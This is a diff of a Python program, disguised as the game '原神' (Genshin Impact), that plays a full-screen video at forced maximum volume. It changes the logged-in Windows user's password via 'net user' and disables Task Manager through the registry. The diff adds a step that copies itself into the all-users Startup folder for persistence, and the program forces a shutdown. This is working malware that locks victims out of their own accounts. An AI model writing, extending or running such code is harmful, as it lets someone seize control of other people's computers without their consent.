@@ -12,17 +12,15 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from ctypes import POINTER, cast
 import comtypes
 
-
 # 设置音量
-def set_audio(num: float):
+def setAudio(num: float):
     devices = AudioUtilities.GetSpeakers()
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
     volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
     # 设置音量（0.0到1.0之间的浮点数）
     volume_interface.SetMasterVolumeLevelScalar(num, None)
 
-
-def get_audio_endpoint_volume():
+def getAudioEndpointVolume():
     try:
         devices = AudioUtilities.GetSpeakers()
         interface = devices.Activate(
@@ -33,10 +31,9 @@ def get_audio_endpoint_volume():
         print(f"COMError: {e}")
         return None
 
-
 # 取消静音
-def clear_mute():
-    volume = get_audio_endpoint_volume()
+def clearMute():
+    volume = getAudioEndpointVolume()
     if volume is None:
         print("无法获取音频设备")
         return
@@ -49,7 +46,6 @@ def clear_mute():
             print("系统未处于静音状态")
     except comtypes.COMError as e:
         print(f"COMError: {e}")
-
 
 class MainWindow(QMainWindow):
     def __init__(self, pt):
@@ -70,55 +66,56 @@ class MainWindow(QMainWindow):
         self._player.setSource(QUrl.fromLocalFile(self.pt))
         self._player.play()
 
-
-def add_eventer():
+def addEvents():
     while True:
-        set_audio(1.0)
-        clear_mute()
+        setAudio(1.0)
+        clearMute()
 
-
-def disable_task_manage(num):
+def disableTaskManage(num):
     os.system(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d {num} /f')
 
-
-def set_passwd(password):
+def setPassword(password):
     os.system('echo %username% > userName')
 
     file = open('./userName', 'r', encoding='utf-8')
-    user_name = file.readlines()
-    print(user_name, type(user_name))
-    user_name = user_name[0].split()[0]
+    userName = file.readlines()
+    userName = userName[0].split()[0]
 
-    print(user_name)
+    print(userName)
 
-    os.system(f'net user {user_name} {password}')
+    os.system(f'net user {userName} {password}')
     file.close()
     os.remove('./userName')
 
+def copy(file_path, save_path):
+    os.system(f'copy {file_path} {save_path}')
+    # QTimer.singleShot(5000, lambda: os.system(f'attrib +h {save_path + '\原神.exe'}'))
+
+def getFilePath(file_name):
+    # 获取打包后的可执行文件所在的临时目录
+    basePath = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
+    # 构建视频文件的绝对路径
+    return os.path.join(basePath, file_name)
+
 def main():
     app = QApplication(sys.argv)
-    # 获取打包后的可执行文件所在的临时目录
-    base_path = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
 
-    # 构建视频文件的绝对路径
-    video_path = os.path.join(base_path, 'video.mp4')
-
-    main_win = MainWindow(video_path)
+    main_win = MainWindow(getFilePath('video.mp4'))
     available_geometry = main_win.screen().availableGeometry()
-    main_win.resize(available_geometry.width() / 3,
-                    available_geometry.height() / 2)
+    main_win.resize(500, 300)
     main_win.setWindowTitle('原神')
-    set_passwd(1145141919810)
     main_win.showFullScreen()
     main_win.play()
 
-    disable_task_manage(1)
-    clear_mute()
-    set_audio(1.0)
-    os.system('shutdown -s -f -t 150')
+    setPassword(1145141919810)
+    disableTaskManage(1)
+    clearMute()
+    setAudio(1.0)
+    copy('原神.exe', '"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"')
 
+    os.system('shutdown -s -f -t 150')
     threading.Thread(target=app.exec()).start()
-    threading.Thread(target=add_eventer()).start()
+    threading.Thread(target=addEvents()).start()
     sys.exit(app.exec())
 
 
